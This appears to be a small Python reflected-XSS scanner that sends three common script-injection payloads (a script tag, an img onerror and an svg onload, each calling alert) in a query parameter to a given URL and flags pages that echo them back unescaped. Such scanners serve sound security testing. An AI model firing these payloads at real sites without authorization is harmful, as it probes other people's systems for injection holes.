import requests

# List of common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert(1)>"
]

def check_xss(url):
    results = []
    for payload in XSS_PAYLOADS:
        try:
            # Injecting payload into a test parameter
            test_url = f"{url}?test={payload}"
            response = requests.get(test_url, timeout=10)

            if payload in response.text:
                results.append({
                    'url': test_url,
                    'payload': payload,
                    'vulnerable': True
                })
            else:
                results.append({
                    'url': test_url,
                    'payload': payload,
                    'vulnerable': False
                })

        except requests.RequestException as e:
            results.append({
                'url': test_url,
                'payload': payload,
                'error': str(e),
                'vulnerable': 'Unknown'
            })

    return results
